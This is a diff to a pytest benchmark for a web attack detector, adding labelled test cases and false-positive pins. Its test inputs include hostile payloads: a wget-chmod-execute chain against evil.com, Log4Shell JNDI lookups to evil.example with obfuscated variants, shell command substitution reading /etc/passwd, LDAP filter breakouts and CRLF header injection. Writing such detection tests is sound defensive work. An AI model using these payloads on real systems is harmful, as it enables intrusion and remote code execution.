@@ -1,5 +1,9 @@
 import json
+import re
+import subprocess
+import sys
 import time
+import zlib
 from collections.abc import Iterator
 from typing import NamedTuple
 from urllib.parse import urlencode
@@ -13,7 +17,17 @@ from guard_core.sync.handlers.suspatterns_handler import (
 )
 from guard_core.sync.utils import detect_penetration_attempt
 from tests.test_sus_patterns.test_detection_benchmark import (
+    _AMBIGUOUS_DOLLAR_SUBSTITUTION_QUERY_URL_KNOWN_FP_REASON,
     _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
+    _ENV_VAR_PREFIXED_SHELL_DASH_C_CI_CONFIG_KNOWN_FP_REASON,
+    _FILENAME_MENTIONED_IN_PROSE_WITH_SPACED_EQUALS_KNOWN_FP_REASON,
+    _RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON,
+    _SEMICOLON_BARE_SHELL_CONTROL_KNOWN_FP_REASON,
+    _SEMICOLON_QUOTED_SHELL_KNOWN_FP_REASON,
+    _SSTI_CALL_OR_FILTER_SYNTAX_KNOWN_FP_REASON,
+    _SSTI_DATE_IN_BRACES_KNOWN_FP_REASON,
+    _WHOLE_VALUE_BARE_SHELL_CONTROL_KNOWN_FP_REASON,
+    _WHOLE_VALUE_SHELL_INVOCATION_KNOWN_FP_REASON,
     BENIGN_CORPUS,
     MALICIOUS_CORPUS,
 )
@@ -23,17 +37,13 @@ _CONFIG = SecurityConfig()
 
 
 @pytest.fixture(autouse=True)
-def _force_legacy_detection_singleton() -> Iterator[None]:
-    sus_patterns_handler._compiler = None
-    sus_patterns_handler._preprocessor = None
-    sus_patterns_handler._semantic_analyzer = None
-    sus_patterns_handler._performance_monitor = None
-    sus_patterns_handler._threat_score_threshold = 1.0
+def _force_enhanced_detection_singleton() -> Iterator[None]:
+    sus_patterns_handler.configure(SecurityConfig())
     yield
 
 
 def _body_request(payload: str, content_type: str) -> SyncMockGuardRequest:
-    body = payload.encode()
+    body = payload.encode("utf-8", errors="surrogateescape")
     headers = {"content-length": str(len(body))}
     if content_type:
         headers["content-type"] = content_type
@@ -46,7 +56,8 @@ def _raw_body_request(payload: str) -> SyncMockGuardRequest:
 
 def _form_body_request(payload: str) -> SyncMockGuardRequest:
     return _body_request(
-        urlencode({"field": payload}), "application/x-www-form-urlencoded"
+        urlencode({"field": payload}, errors="surrogateescape"),
+        "application/x-www-form-urlencoded",
     )
 
 
@@ -63,6 +74,10 @@ def _multipart_body_request(payload: str) -> SyncMockGuardRequest:
 
 def _header_request(payload: str) -> SyncMockGuardRequest:
     return SyncMockGuardRequest(headers={"x-e2e-probe": payload})
+
+
+def _user_agent_header_request(payload: str) -> SyncMockGuardRequest:
+    return SyncMockGuardRequest(headers={"user-agent": payload})
 
 
 def _query_param_request(payload: str) -> SyncMockGuardRequest:
@@ -433,11 +448,335 @@ _TARGETED_CASES: list[TargetedCase] = [
         False,
         _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
     ),
+    TargetedCase(
+        "cmd_absolute_path_shell_dash_c_query_param",
+        _query_param_request("/bin/sh -c id"),
+        True,
+    ),
+    TargetedCase(
+        "cmd_env_prefixed_shell_dash_c_query_param",
+        _query_param_request("env bash -c id"),
+        True,
+    ),
+    TargetedCase(
+        "cmd_env_abs_path_shell_dash_c_query_param",
+        _query_param_request("/usr/bin/env bash -c id"),
+        True,
+    ),
+    TargetedCase(
+        "cmd_separator_env_abs_path_shell_query_param",
+        _query_param_request("; /usr/bin/env sh -c id"),
+        True,
+    ),
+    TargetedCase(
+        "ldap_double_paren_wildcard_breakout_query_param",
+        _query_param_request("*)((objectClass=*"),
+        True,
+    ),
+    TargetedCase(
+        "ldap_null_byte_truncation_breakout_query_param",
+        _query_param_request("*))%00"),
+        True,
+    ),
+    TargetedCase(
+        "ldap_null_byte_single_paren_attr_uid_query_param",
+        _query_param_request("uid=*)%00"),
+        True,
+    ),
+    TargetedCase(
+        "ldap_null_byte_single_paren_filter_uid_query_param",
+        _query_param_request("(uid=*)%00"),
+        True,
+    ),
+    TargetedCase(
+        "ldap_null_byte_single_paren_attr_mail_query_param",
+        _query_param_request("mail=*)%00"),
+        True,
+    ),
+    TargetedCase(
+        "ldap_null_byte_single_paren_attr_objectclass_query_param",
+        _query_param_request("objectClass=*)%00"),
+        True,
+    ),
+    TargetedCase(
+        "ldap_glob_paren_null_mention_query_param",
+        _query_param_request("glob pattern: *)%00 in filenames"),
+        False,
+    ),
+    TargetedCase(
+        "http_split_crlf_set_cookie_header",
+        _header_request("x\r\nSet-Cookie: session=hijacked"),
+        True,
+    ),
+    TargetedCase(
+        "sqli_bare_comment_dashdash_query_param",
+        _query_param_request("admin'--"),
+        True,
+    ),
+    TargetedCase(
+        "cms_probing_wp_content_themes_default_url_path",
+        _url_path_request("/wp-content/themes/default"),
+        True,
+    ),
+    TargetedCase(
+        "recon_nested_inicio_html_url_path",
+        _url_path_request("/en/inicio.html"),
+        True,
+    ),
+    TargetedCase(
+        "rest_path_k8s_namespace_pods_url_path_benign",
+        _url_path_request("/api/v1/namespaces/default/pods"),
+        False,
+    ),
+    TargetedCase(
+        "rest_path_k8s_default_namespace_url_path_benign",
+        _url_path_request("/api/v1/namespaces/default"),
+        False,
+    ),
 ]
 
 
-def _mechanism_for_index(mechanisms: tuple[str, ...], index: int) -> str:
-    return mechanisms[index % len(mechanisms)]
+_BACKTICK_SQL_KEYWORD_EXEMPTION_BYPASS_TARGETED_CASES: list[TargetedCase] = [
+    TargetedCase(
+        "defect5_form_body_keyword_after_glued_shell_command",
+        _form_body_request("search`whoami` LIMIT 10"),
+        False,
+        "a glued bare word inside backticks with no shell operator anywhere in "
+        "the surrounding window and no adjacent strong SQL keyword is "
+        "syntactically indistinguishable from a MySQL backtick-quoted "
+        "identifier concatenated onto other text (MySQL quoted identifiers may "
+        "sit directly adjacent to other tokens); this project's own benign "
+        "corpus (cmd_injection_glued_plausible_token_ref_user_list, "
+        "cmd_injection_glued_kebab_identifier_header_forward) pins the "
+        "identical shape as non-threat, so flagging on spelling alone is the "
+        "removed anti-pattern and flagging on structure alone is not possible "
+        "here without an operator or SQL-keyword signal",
+    ),
+    TargetedCase(
+        "defect5_json_body_keyword_before_glued_shell_command",
+        _json_body_request("SELECT note; search`whoami`"),
+        True,
+    ),
+    TargetedCase(
+        "defect5_multipart_body_bare_chained_download_and_execute",
+        _multipart_body_request(
+            "set your profile bio to: "
+            "`wget evil.com/x -O /tmp/x;chmod +x /tmp/x;/tmp/x`"
+        ),
+        True,
+    ),
+    TargetedCase(
+        "defect5_query_param_prefix_command_word",
+        _query_param_request("curl`whoami` data on file"),
+        True,
+    ),
+]
+
+
+_ROUND6_CMD_SUBSTITUTION_TARGETED_CASES: list[TargetedCase] = [
+    TargetedCase(
+        "round6_log4shell_direct_ldap_query_param",
+        _query_param_request("${jndi:ldap://evil.example/a}"),
+        True,
+    ),
+    TargetedCase(
+        "round6_log4shell_obfuscated_lower_form_body",
+        _form_body_request("${${lower:j}ndi:ldap://evil.example/a}"),
+        True,
+    ),
+    TargetedCase(
+        "round6_dollar_paren_unambiguous_json_body",
+        _json_body_request("$(cat /etc/passwd)"),
+        True,
+    ),
+    TargetedCase(
+        "round6_dollar_brace_ifs_multipart_body",
+        _multipart_body_request("${IFS}"),
+        True,
+    ),
+    TargetedCase(
+        "round6_dollar_paren_ambiguous_bare_query_param",
+        _query_param_request("$(id)"),
+        True,
+    ),
+    TargetedCase(
+        "round6_dollar_paren_ambiguous_bare_url_path",
+        _url_path_request("$(id)"),
+        True,
+    ),
+    TargetedCase(
+        "round6_dollar_paren_ambiguous_bare_raw_body_benign",
+        _raw_body_request("$(id)"),
+        False,
+    ),
+    TargetedCase(
+        "round6_sql_keyword_not_glued_no_longer_exempts_dollar_query_param",
+        _query_param_request("x$(id) JOIN accounts"),
+        True,
+    ),
+    TargetedCase(
+        "round6_sql_keyword_glued_no_space_still_exempts_dollar_query_param",
+        _query_param_request("SELECT$(id)FROM users"),
+        False,
+    ),
+    TargetedCase(
+        "round6_denylist_nmap_glued_backtick_raw_body",
+        _raw_body_request("x`nmap`"),
+        False,
+        "a glued bare word inside backticks with no shell operator anywhere in "
+        "the surrounding window and no adjacent strong SQL keyword is "
+        "syntactically indistinguishable from a MySQL backtick-quoted "
+        "identifier concatenated onto other text; the command-name list this "
+        "case used to depend on is the removed anti-pattern, and there is no "
+        "structural signal left to distinguish nmap from any other bare word "
+        "in this position",
+    ),
+    TargetedCase(
+        "round6_log4shell_direct_ldap_custom_header",
+        _header_request("${jndi:ldap://evil.example/a}"),
+        True,
+    ),
+    TargetedCase(
+        "round6_log4shell_obfuscated_lower_custom_header",
+        _header_request("${lower:j}ndi"),
+        True,
+    ),
+    TargetedCase(
+        "round6_log4shell_obfuscated_default_value_custom_header",
+        _header_request("${::-j}ndi"),
+        True,
+    ),
+    TargetedCase(
+        "round6_log4shell_direct_ldap_user_agent",
+        _user_agent_header_request("${jndi:ldap://evil.example/a}"),
+        True,
+    ),
+    TargetedCase(
+        "round6_log4shell_obfuscated_lower_user_agent",
+        _user_agent_header_request("${lower:j}ndi"),
+        True,
+    ),
+    TargetedCase(
+        "round6_log4shell_obfuscated_default_value_user_agent",
+        _user_agent_header_request("${::-j}ndi"),
+        True,
+    ),
+    TargetedCase(
+        "round6_chaotic_user_agent_chrome_windows_benign",
+        _user_agent_header_request(
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+            "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+        ),
+        False,
+    ),
+    TargetedCase(
+        "round6_chaotic_user_agent_safari_macos_benign",
+        _user_agent_header_request(
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
+            "(KHTML, like Gecko) Version/17.0 Safari/605.1.15"
+        ),
+        False,
+    ),
+    TargetedCase(
+        "round6_chaotic_user_agent_googlebot_benign",
+        _user_agent_header_request(
+            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
+        ),
+        False,
+    ),
+    TargetedCase(
+        "round6_chaotic_user_agent_curl_benign",
+        _user_agent_header_request("curl/8.4.0"),
+        False,
+    ),
+    TargetedCase(
+        "round6_chaotic_user_agent_python_requests_benign",
+        _user_agent_header_request("python-requests/2.31.0"),
+        False,
+    ),
+    TargetedCase(
+        "round6_chaotic_user_agent_postman_benign",
+        _user_agent_header_request("PostmanRuntime/7.36.0"),
+        False,
+    ),
+]
+
+
+_DOLLAR_FP_AND_LOG4SHELL_BONUS_TARGETED_CASES: list[TargetedCase] = [
+    TargetedCase(
+        "disclosed_fp_shell_docs_var_expansion_query_param",
+        _query_param_request("export PATH=${HOME}/bin"),
+        True,
+    ),
+    TargetedCase(
+        "disclosed_fp_shell_docs_var_expansion_url_path",
+        _url_path_request("export PATH=${HOME}/bin"),
+        True,
+    ),
+    TargetedCase(
+        "disclosed_fp_template_dollar_brace_var_query_param",
+        _query_param_request("Set the amount with ${amount} in the template."),
+        True,
+    ),
+    TargetedCase(
+        "disclosed_fp_template_dollar_brace_var_url_path",
+        _url_path_request("Set the amount with ${amount} in the template."),
+        True,
+    ),
+    TargetedCase(
+        "disclosed_fp_template_makefile_variable_query_param",
+        _query_param_request(
+            "The Makefile references $(CC) and $(CFLAGS) for the compiler."
+        ),
+        True,
+    ),
+    TargetedCase(
+        "disclosed_fp_template_makefile_variable_url_path",
+        _url_path_request(
+            "The Makefile references $(CC) and $(CFLAGS) for the compiler."
+        ),
+        True,
+    ),
+    TargetedCase(
+        "disclosed_fp_jquery_selector_bare_id_call_query_param",
+        _query_param_request("$(id).addClass('active');"),
+        True,
+    ),
+    TargetedCase(
+        "disclosed_fp_jquery_selector_bare_id_call_url_path",
+        _url_path_request("$(id).addClass('active');"),
+        True,
+    ),
+    TargetedCase(
+        "disclosed_fp_jquery_selector_hash_id_call_query_param",
+        _query_param_request("$('#submit-button').on('click', handleSubmit);"),
+        True,
+    ),
+    TargetedCase(
+        "disclosed_fp_jquery_selector_hash_id_call_url_path",
+        _url_path_request("$('#submit-button').on('click', handleSubmit);"),
+        True,
+    ),
+    TargetedCase(
+        "log4shell_url_path_bonus_obfuscated_lower_bare",
+        _url_path_request("${lower:j}ndi"),
+        True,
+    ),
+    TargetedCase(
+        "log4shell_url_path_bonus_obfuscated_default_value_bare",
+        _url_path_request("${::-j}ndi"),
+        True,
+    ),
+    TargetedCase(
+        "log4shell_url_path_bonus_obfuscated_nested_full_exploit",
+        _url_path_request("${${lower:j}ndi:ldap://evil.example/a}"),
+        True,
+    ),
+]
+
+
+def _mechanism_for_case_id(mechanisms: tuple[str, ...], case_id: str) -> str:
+    return mechanisms[zlib.crc32(case_id.encode()) % len(mechanisms)]
 
 
 def _detected_via(mechanism: str, payload: str) -> bool:
@@ -451,9 +790,161 @@ def _fraction(numerator: int, denominator: int) -> str:
     return f"{numerator}/{denominator} ({percentage:.1f}%)"
 
 
-_KNOWN_E2E_FALSE_POSITIVES: dict[str, str] = {}
+_GLUED_KEBAB_IDENTIFIER_BACKTICK_KNOWN_FP_REASON = (
+    "a kebab-style identifier glued to a backtick (`config`well-known`here`) is "
+    "benign by design and is Phase 0's own accepted ambiguous-gate tradeoff for "
+    "the backtick discriminator, already pinned in query_param by "
+    "test_glued_kebab_identifier_backtick_payload_flagged_in_query_param, and "
+    "stays correctly benign in request_body, where the branch never fires"
+)
 
-BASELINE_MALICIOUS_DETECTED_TOTAL = 163
+_JSON_FIELD_WHOLE_VALUE_SOURCE_PATH_KNOWN_FP_REASON = (
+    "a JSON body whose entire value for a field is itself a bare internal "
+    "source-file path (path: /opt/app/worker.py) is character-identical, "
+    "once the embedded-JSON field scanner isolates the field value and "
+    "re-scans it on its own under an unrestricted context, to the "
+    "sensitive_file bare-path shape that pattern exists to catch; an "
+    "ordinary file-watch or build-event payload cannot be told apart from a "
+    "sensitive-file probe by shape alone, and the same JSON body stays "
+    "correctly benign when scanned as a whole string instead of field-by-field"
+)
+
+_KNOWN_E2E_FALSE_POSITIVE_SOURCES: dict[str, tuple[str, str]] = {
+    "cmd_injection_prose_semicolon_quoted_absolute_shell_ls": (
+        _SEMICOLON_QUOTED_SHELL_KNOWN_FP_REASON,
+        "raw_body",
+    ),
+    "cmd_injection_prose_semicolon_quoted_absolute_shell_whoami": (
+        _SEMICOLON_QUOTED_SHELL_KNOWN_FP_REASON,
+        "multipart_body",
+    ),
+    "cmd_injection_prose_semicolon_quoted_env_prefixed_shell": (
+        _SEMICOLON_QUOTED_SHELL_KNOWN_FP_REASON,
+        "query_param",
+    ),
+    "cmd_injection_prose_semicolon_quoted_absolute_shell_debug_flag": (
+        _SEMICOLON_QUOTED_SHELL_KNOWN_FP_REASON,
+        "query_param",
+    ),
+    "cmd_injection_value_absolute_bash_login_flag": (
+        _WHOLE_VALUE_SHELL_INVOCATION_KNOWN_FP_REASON,
+        "multipart_body",
+    ),
+    "cmd_injection_value_absolute_shell_c_npm_start": (
+        _WHOLE_VALUE_SHELL_INVOCATION_KNOWN_FP_REASON,
+        "multipart_body",
+    ),
+    "cmd_injection_value_env_prefixed_bash_c_echo": (
+        _WHOLE_VALUE_SHELL_INVOCATION_KNOWN_FP_REASON,
+        "json_body_nested",
+    ),
+    "cmd_injection_value_bare_shell_control": (
+        _WHOLE_VALUE_BARE_SHELL_CONTROL_KNOWN_FP_REASON,
+        "query_param",
+    ),
+    "cmd_injection_ci_yaml_env_prefixed_run_step": (
+        _ENV_VAR_PREFIXED_SHELL_DASH_C_CI_CONFIG_KNOWN_FP_REASON,
+        "query_param",
+    ),
+    "cmd_injection_makefile_env_prefixed_recipe": (
+        _ENV_VAR_PREFIXED_SHELL_DASH_C_CI_CONFIG_KNOWN_FP_REASON,
+        "query_param",
+    ),
+    "cmd_injection_glued_kebab_identifier_config_well_known": (
+        _GLUED_KEBAB_IDENTIFIER_BACKTICK_KNOWN_FP_REASON,
+        "query_param",
+    ),
+    "sensitive_file_json_payload_ending_source_path": (
+        _JSON_FIELD_WHOLE_VALUE_SOURCE_PATH_KNOWN_FP_REASON,
+        "url_path",
+    ),
+    "cmd_injection_shell_docs_var_expansion": (
+        _AMBIGUOUS_DOLLAR_SUBSTITUTION_QUERY_URL_KNOWN_FP_REASON,
+        "url_path",
+    ),
+    "cmd_injection_jquery_selector_hash_id_call": (
+        _AMBIGUOUS_DOLLAR_SUBSTITUTION_QUERY_URL_KNOWN_FP_REASON,
+        "query_param",
+    ),
+    "file_inclusion_benign_readme_txt_link": (
+        _RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON,
+        "raw_body",
+    ),
+    "file_inclusion_benign_docs_readme_txt_link": (
+        _RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON,
+        "url_path",
+    ),
+    "file_inclusion_benign_terms_txt_link": (
+        _RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON,
+        "query_param",
+    ),
+    "file_inclusion_benign_docker_installer_sh_link": (
+        _RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON,
+        "json_body_nested",
+    ),
+    "file_inclusion_benign_cgi_search_link": (
+        _RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON,
+        "form_body",
+    ),
+    "template_fp_date_curly_brace": (
+        _SSTI_DATE_IN_BRACES_KNOWN_FP_REASON,
+        "raw_body",
+    ),
+    "template_fp_call_branch_format_x": (
+        _SSTI_CALL_OR_FILTER_SYNTAX_KNOWN_FP_REASON,
+        "json_body_nested",
+    ),
+    "template_fp_call_branch_round_filter": (
+        _SSTI_CALL_OR_FILTER_SYNTAX_KNOWN_FP_REASON,
+        "multipart_body",
+    ),
+    "template_fp_call_branch_helper_format": (
+        _SSTI_CALL_OR_FILTER_SYNTAX_KNOWN_FP_REASON,
+        "query_param",
+    ),
+    "file_upload_prose_ticket_dangerous_filename_spaced_equals": (
+        _FILENAME_MENTIONED_IN_PROSE_WITH_SPACED_EQUALS_KNOWN_FP_REASON,
+        "form_body",
+    ),
+    "cmd_injection_prose_semicolon_bare_shell_control": (
+        _SEMICOLON_BARE_SHELL_CONTROL_KNOWN_FP_REASON,
+        "header",
+    ),
+    "template_fp_date_hash_brace": (
+        _SSTI_DATE_IN_BRACES_KNOWN_FP_REASON,
+        "url_path",
+    ),
+    "template_fp_call_branch_map_arrow": (
+        _SSTI_CALL_OR_FILTER_SYNTAX_KNOWN_FP_REASON,
+        "url_path",
+    ),
+}
+
+_KNOWN_E2E_FALSE_POSITIVES: dict[str, str] = {
+    f"{case_id}[{mechanism}]": reason
+    for case_id, (reason, mechanism) in _KNOWN_E2E_FALSE_POSITIVE_SOURCES.items()
+}
+
+BASELINE_MALICIOUS_DETECTED_TOTAL = 311
+_LEGACY_BASELINE_MALICIOUS_DETECTED_TOTAL = 305
+
+_UNCOVERED_CPU_TIME_CEILING_SECONDS = 100.0
+_CPU_TIME_REPORT_PATTERN = re.compile(r"cpu time: ([\d.]+)s")
+_CHILD_CPU_TIME_SCRIPT = (
+    "import sys, time, pytest\n"
+    "start = time.process_time()\n"
+    "code = pytest.main(['--no-cov', '-q', '-s', '-W', 'error', sys.argv[1]])\n"
+    "print(f'cpu time: {time.process_time() - start:.3f}s')\n"
+    "sys.exit(code)\n"
+)
+
+
+def _reset_singleton_to_legacy() -> None:
+    sus_patterns_handler._compiler = None
+    sus_patterns_handler._preprocessor = None
+    sus_patterns_handler._semantic_analyzer = None
+    sus_patterns_handler._performance_monitor = None
+    sus_patterns_handler._threat_score_threshold = 1.0
 
 
 def test_detect_penetration_attempt_recall_and_false_positive_rate() -> None:
@@ -467,9 +958,9 @@ def test_detect_penetration_attempt_recall_and_false_positive_rate() -> None:
     undetected_case_ids: list[str] = []
     detected_by_mechanism: dict[str, int] = {}
     total_by_mechanism: dict[str, int] = {}
-    for index, case in enumerate(_PRODUCTION_MALICIOUS_CASES):
-        mechanism = _mechanism_for_index(
-            _valid_mechanisms_for_category(case.category), index
+    for case in _PRODUCTION_MALICIOUS_CASES:
+        mechanism = _mechanism_for_case_id(
+            _valid_mechanisms_for_category(case.category), case.case_id
         )
         mechanisms_exercised.add(mechanism)
         total_by_mechanism[mechanism] = total_by_mechanism.get(mechanism, 0) + 1
@@ -484,19 +975,16 @@ def test_detect_penetration_attempt_recall_and_false_positive_rate() -> None:
     benign_flagged = 0
     known_false_positive_case_ids: list[str] = []
     unexpected_false_positive_case_ids: list[str] = []
-    for index, benign_case in enumerate(_PRODUCTION_BENIGN_CASES):
-        mechanism = _mechanism_for_index(_ALL_MECHANISMS, index)
+    for benign_case in _PRODUCTION_BENIGN_CASES:
+        mechanism = _mechanism_for_case_id(_ALL_MECHANISMS, benign_case.case_id)
         mechanisms_exercised.add(mechanism)
         if _detected_via(mechanism, benign_case.payload):
             benign_flagged += 1
-            if benign_case.case_id in _KNOWN_E2E_FALSE_POSITIVES:
-                known_false_positive_case_ids.append(
-                    f"{benign_case.case_id}[{mechanism}]"
-                )
+            pin_key = f"{benign_case.case_id}[{mechanism}]"
+            if pin_key in _KNOWN_E2E_FALSE_POSITIVES:
+                known_false_positive_case_ids.append(pin_key)
             else:
-                unexpected_false_positive_case_ids.append(
-                    f"{benign_case.case_id}[{mechanism}]"
-                )
+                unexpected_false_positive_case_ids.append(pin_key)
 
     targeted_failures: list[str] = []
     for targeted in _TARGETED_CASES:
@@ -504,14 +992,32 @@ def test_detect_penetration_attempt_recall_and_false_positive_rate() -> None:
         if result.is_threat != targeted.expect_detected:
             targeted_failures.append(targeted.case_id)
 
+    backtick_targeted_failures: list[str] = []
+    for targeted in _BACKTICK_SQL_KEYWORD_EXEMPTION_BYPASS_TARGETED_CASES:
+        result = detect_penetration_attempt(targeted.request, _CONFIG)
+        if result.is_threat != targeted.expect_detected:
+            backtick_targeted_failures.append(targeted.case_id)
+
+    round6_targeted_failures: list[str] = []
+    for targeted in _ROUND6_CMD_SUBSTITUTION_TARGETED_CASES:
+        result = detect_penetration_attempt(targeted.request, _CONFIG)
+        if result.is_threat != targeted.expect_detected:
+            round6_targeted_failures.append(targeted.case_id)
+
+    dollar_fp_and_log4shell_bonus_failures: list[str] = []
+    for targeted in _DOLLAR_FP_AND_LOG4SHELL_BONUS_TARGETED_CASES:
+        result = detect_penetration_attempt(targeted.request, _CONFIG)
+        if result.is_threat != targeted.expect_detected:
+            dollar_fp_and_log4shell_bonus_failures.append(targeted.case_id)
+
     wall_time_seconds = time.monotonic() - start
 
     report_lines = [
         "END-TO-END DETECTION BENCHMARK REPORT (detect_penetration_attempt)",
         f"malicious corpus: {len(_PRODUCTION_MALICIOUS_CASES)} cases "
         f"({len(MALICIOUS_CORPUS) - len(_PRODUCTION_MALICIOUS_CASES)} "
-        "encoding-only cases excluded: the shared production singleton runs "
-        "without a preprocessor by default)",
+        "encoding-only cases excluded: those target the isolated "
+        "encoding-aware manager, not the shared production singleton)",
         f"benign corpus: {len(_PRODUCTION_BENIGN_CASES)} cases",
         f"mechanisms exercised: {sorted(mechanisms_exercised)}",
         f"wall time: {wall_time_seconds:.3f}s",
@@ -533,7 +1039,7 @@ def test_detect_penetration_attempt_recall_and_false_positive_rate() -> None:
             f"total fp rate: "
             f"{_fraction(benign_flagged, len(_PRODUCTION_BENIGN_CASES))}",
             "",
-            "targeted embedded-probe cases (defect 5):",
+            "targeted entry-level cases:",
         ]
     )
     for targeted in _TARGETED_CASES:
@@ -542,13 +1048,44 @@ def test_detect_penetration_attempt_recall_and_false_positive_rate() -> None:
             f"gap={targeted.known_gap_reason or 'none'}"
         )
     report_lines.append("")
+    report_lines.append(
+        "targeted backtick sql-keyword-exemption-bypass cases (defect 5):"
+    )
+    for targeted in _BACKTICK_SQL_KEYWORD_EXEMPTION_BYPASS_TARGETED_CASES:
+        report_lines.append(
+            f"  {targeted.case_id}: expected={targeted.expect_detected}"
+        )
+    report_lines.append("")
+    report_lines.append(
+        "targeted round-6 command-substitution cases "
+        "(dollar-paren/brace, log4shell, sql-keyword-glue):"
+    )
+    for targeted in _ROUND6_CMD_SUBSTITUTION_TARGETED_CASES:
+        report_lines.append(
+            f"  {targeted.case_id}: expected={targeted.expect_detected}"
+        )
+    report_lines.append("")
+    report_lines.append(
+        "targeted dollar-substitution disclosed-FP and log4shell "
+        "url_path bonus cases (ruling items 1-2):"
+    )
+    for targeted in _DOLLAR_FP_AND_LOG4SHELL_BONUS_TARGETED_CASES:
+        report_lines.append(
+            f"  {targeted.case_id}: expected={targeted.expect_detected}"
+        )
+    report_lines.append("")
     report_lines.append("known end-to-end false positives (documented, still counted):")
-    for case_id, reason in _KNOWN_E2E_FALSE_POSITIVES.items():
-        report_lines.append(f"  {case_id}: {reason}")
+    for pin_key, reason in _KNOWN_E2E_FALSE_POSITIVES.items():
+        report_lines.append(f"  {pin_key}: {reason}")
     report = "\n".join(report_lines)
     print(report)
 
     assert not targeted_failures, f"{targeted_failures}\n{report}"
+    assert not backtick_targeted_failures, f"{backtick_targeted_failures}\n{report}"
+    assert not round6_targeted_failures, f"{round6_targeted_failures}\n{report}"
+    assert not dollar_fp_and_log4shell_bonus_failures, (
+        f"{dollar_fp_and_log4shell_bonus_failures}\n{report}"
+    )
 
     assert malicious_detected >= BASELINE_MALICIOUS_DETECTED_TOTAL, (
         f"overall recall regressed: baseline={BASELINE_MALICIOUS_DETECTED_TOTAL} "
@@ -562,3 +1099,151 @@ def test_detect_penetration_attempt_recall_and_false_positive_rate() -> None:
         f"more benign cases flagged than documented known false positives: "
         f"actual={benign_flagged} known={known_false_positive_case_ids}\n{report}"
     )
+
+
+def test_detect_penetration_attempt_cpu_time_ceiling_uncovered() -> None:
+    node_id = (
+        f"{__file__}::test_detect_penetration_attempt_recall_and_false_positive_rate"
+    )
+
+    result = subprocess.run(
+        [sys.executable, "-c", _CHILD_CPU_TIME_SCRIPT, node_id],
+        capture_output=True,
+        text=True,
+        timeout=180,
+    )
+
+    assert result.returncode == 0, (
+        f"uncovered benchmark subprocess failed:\n{result.stdout}\n{result.stderr}"
+    )
+
+    match = _CPU_TIME_REPORT_PATTERN.search(result.stdout)
+    assert match, f"could not find cpu time in subprocess output:\n{result.stdout}"
+    cpu_time_seconds = float(match.group(1))
+
+    assert cpu_time_seconds < _UNCOVERED_CPU_TIME_CEILING_SECONDS, (
+        "end-to-end detection benchmark uncovered CPU time regressed: measured "
+        "via time.process_time() inside the child pytest subprocess around a "
+        "single run, not the parent's wall clock, so host contention cannot "
+        "produce a false failure the way wall-clock timing did before. Clean "
+        "baseline measured 62.2s-68.5s CPU across repeated runs on this "
+        "machine under heavy concurrent load; the ceiling is roughly 1.45x "
+        "that ~68.5s max, tight enough to catch an order-of-magnitude ReDoS "
+        "regression while absorbing normal CPU-time variance. "
+        f"ceiling={_UNCOVERED_CPU_TIME_CEILING_SECONDS}s "
+        f"actual={cpu_time_seconds:.3f}s"
+    )
+
+
+def test_detect_penetration_attempt_legacy_smoke() -> None:
+    original_detection_state = sus_patterns_handler._detection_state
+    _reset_singleton_to_legacy()
+
+    try:
+        malicious_detected = 0
+        for case in _PRODUCTION_MALICIOUS_CASES:
+            mechanism = _mechanism_for_case_id(
+                _valid_mechanisms_for_category(case.category), case.case_id
+            )
+            if _detected_via(mechanism, case.payload):
+                malicious_detected += 1
+
+        benign_flagged = 0
+        for benign_case in _PRODUCTION_BENIGN_CASES:
+            mechanism = _mechanism_for_case_id(_ALL_MECHANISMS, benign_case.case_id)
+            if _detected_via(mechanism, benign_case.payload):
+                benign_flagged += 1
+
+        assert malicious_detected >= _LEGACY_BASELINE_MALICIOUS_DETECTED_TOTAL, (
+            f"legacy singleton recall regressed: "
+            f"baseline={_LEGACY_BASELINE_MALICIOUS_DETECTED_TOTAL} "
+            f"actual={malicious_detected}"
+        )
+        assert benign_flagged <= len(_KNOWN_E2E_FALSE_POSITIVES), (
+            f"legacy singleton false-positive rate rose: "
+            f"baseline={len(_KNOWN_E2E_FALSE_POSITIVES)} actual={benign_flagged}"
+        )
+    finally:
+        sus_patterns_handler._detection_state = original_detection_state
+
+
+def test_mechanism_for_case_id_canary_sentinels_stay_fixed() -> None:
+    assert (
+        _mechanism_for_case_id(_ALL_MECHANISMS, "sentinel_case_alpha")
+        == "multipart_body"
+    )
+    assert _mechanism_for_case_id(_ALL_MECHANISMS, "sentinel_case_delta") == "url_path"
+    assert (
+        _mechanism_for_case_id(_ALL_MECHANISMS, "sentinel_case_epsilon")
+        == "json_body_nested"
+    )
+
+
+def test_mechanism_assignment_unchanged_by_corpus_append() -> None:
+    case_ids = [case.case_id for case in _PRODUCTION_BENIGN_CASES[:10]]
+    before = {
+        case_id: _mechanism_for_case_id(_ALL_MECHANISMS, case_id)
+        for case_id in case_ids
+    }
+
+    grown_case_ids = [*case_ids, "newly_appended_dummy_corpus_case"]
+    after = {
+        case_id: _mechanism_for_case_id(_ALL_MECHANISMS, case_id)
+        for case_id in grown_case_ids
+        if case_id in before
+    }
+
+    assert before == after
+
+
+def test_known_e2e_false_positive_pins_are_all_non_vacuous() -> None:
+    payload_by_case_id = {
+        case.case_id: case.payload for case in _PRODUCTION_BENIGN_CASES
+    }
+
+    for case_id, (_, mechanism) in _KNOWN_E2E_FALSE_POSITIVE_SOURCES.items():
+        derived_mechanism = _mechanism_for_case_id(_ALL_MECHANISMS, case_id)
+        assert derived_mechanism == mechanism, (
+            f"{case_id}: pinned mechanism {mechanism!r} no longer matches the "
+            f"case-id-derived mechanism {derived_mechanism!r}"
+        )
+        assert _detected_via(mechanism, payload_by_case_id[case_id]), (
+            f"{case_id}[{mechanism}]: pin is vacuous, this mechanism does not "
+            "flag the payload"
+        )
+
+
